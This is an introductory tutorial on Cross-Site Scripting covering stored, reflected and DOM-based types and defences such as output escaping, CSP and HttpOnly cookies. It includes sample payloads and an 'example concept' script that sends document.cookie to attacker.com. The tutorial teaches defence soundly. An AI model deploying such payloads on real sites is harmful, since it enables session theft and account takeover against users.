Cross-Site Scripting (XSS)
What is XSS?

Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious script code, usually JavaScript, into a web page viewed by other users.

In simple words, XSS happens when a website accepts untrusted user input and shows it in the browser without proper filtering or escaping.

Because the browser thinks the script is part of the normal website, it executes the code.

Easy Explanation

Imagine a website has a comment box.

A normal user writes:

This website is helpful.

But an attacker writes something like:

<script>alert('Hacked')</script>

If the website displays that code directly without protection, the browser runs the script.

That means the attacker can:

show unwanted pop-ups

steal session cookies

redirect users

change page content

run malicious JavaScript in the victim's browser

Why XSS is Dangerous

XSS is dangerous because it attacks the user's browser.

An attacker may be able to:

steal cookies

hijack a user session

redirect users to a fake website

display fake login forms

modify the content of a web page

perform actions as the victim

If the victim is an admin, the damage can be much worse.

Why XSS Happens

XSS usually happens when:

a website accepts user input

the input is not validated or sanitized

the website prints the input directly in HTML

the browser executes the script

The core problem is simple:

Untrusted input is treated as trusted code.

Common Places Where XSS Happens

XSS can occur in many areas such as:

comment sections

search boxes

login forms

profile pages

chat systems

product reviews

URL parameters

Anywhere that user input is displayed in the browser can become a target.

Basic Example

Unsafe server code example:

<p>Welcome, <?php echo $_GET['name']; ?></p>

If a user visits:

http://example.com/?name=<script>alert('XSS')</script>

The browser may execute the script.

Types of XSS

There are three main types.

1. Stored XSS

Stored XSS occurs when malicious input is saved on the server.

Example flow:

Attacker submits a malicious comment
→ Comment is stored in database
→ Other users open the page
→ Browser executes the script

Stored XSS is dangerous because many users can be affected automatically.

Common targets:

forums

comment sections

user profiles

reviews

2. Reflected XSS

Reflected XSS happens when malicious input is immediately reflected in a web response.

Example:

A search page shows:

You searched for: user_input

If the input is not filtered, an attacker can send a malicious link.

Example attack:

Victim clicks the link
→ script executes in the browser

3. DOM-Based XSS

DOM-Based XSS happens when client-side JavaScript inserts unsafe input into the page.

Example:

document.getElementById("output").innerHTML = location.hash;

If the URL contains malicious input, the browser may execute it.

XSS Type Comparison
Type	Stored Location	Cause
Stored XSS	Database	unsafe stored input
Reflected XSS	HTTP request	unsafe reflected input
DOM XSS	Browser DOM	unsafe JavaScript
Example Payloads

Common testing payloads:

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

Security testers use these to confirm whether XSS exists.

What Attackers Can Do

An attacker may:

steal session tokens

impersonate users

redirect victims

modify page content

inject fake forms

load external malicious scripts

Example concept:

<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

Modern protections often limit this, but the risk still exists.

Real-World Impact

XSS can lead to:

account takeover

data theft

phishing attacks

website defacement

financial fraud

loss of user trust

Even if the server is not fully hacked, users can still be seriously affected.

How to Prevent XSS

Good security requires multiple layers.

1. Validate Input

Only allow expected input.

Examples:

numbers in age fields

valid emails in email fields

restricted characters in usernames

2. Escape Output

Convert special characters before displaying them.

Example:

<  becomes  &lt;
>  becomes  &gt;

This prevents browsers from executing the code.

3. Avoid Dangerous JavaScript

Unsafe:

element.innerHTML = userInput

Safer:

element.textContent = userInput

Avoid functions like:

innerHTML

document.write

eval

4. Use Content Security Policy (CSP)

CSP is a browser security feature that restricts:

inline scripts

unknown script sources

unsafe JavaScript execution

It adds an extra defense layer.

5. Use HttpOnly Cookies

HttpOnly cookies cannot be accessed by JavaScript.

This helps reduce cookie theft through XSS.

Secure Coding Mindset

A good rule in cybersecurity:

Never trust user input.

Always assume user input could be malicious.

Difference Between XSS and SQL Injection

XSS:

attacks the browser

injects JavaScript

affects users

SQL Injection:

attacks the database

injects SQL commands

affects backend data

Simple Analogy

Imagine a public notice board.

A normal person leaves a message.

But an attacker hides a trap behind the board.

Anyone who reads it gets affected.

That is similar to XSS.

Key Terms

Payload
Malicious code used in the attack.

Sanitization
Cleaning input to remove dangerous content.

Escaping
Converting characters into safe output.

Session Hijacking
Taking control of a logged-in user session.

DOM
Document Object Model, the page structure used by the browser.
